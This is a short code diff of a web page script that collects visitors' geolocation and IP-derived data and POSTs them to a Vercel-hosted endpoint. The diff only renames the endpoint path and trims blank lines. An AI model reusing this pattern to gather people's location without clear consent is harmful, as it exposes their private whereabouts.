@@ -42,7 +42,7 @@
             document.getElementById("geolocation").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
 
             // Send the geolocation data to the server
-            fetch('https://surprise-lime.vercel.app/user-data', {
+            fetch('https://surprise-lime.vercel.app/api/user-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -91,7 +91,7 @@
                     const timestamp = new Date().toISOString();
 
                     // Send the IP data to the server
-                    fetch('https://surprise-lime.vercel.app/user-data', {
+                    fetch('https://surprise-lime.vercel.app/api/user-data', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -118,13 +118,6 @@
     </script>
 </body>
 </html>
-
-
-
-
-
-
-
 
 
 
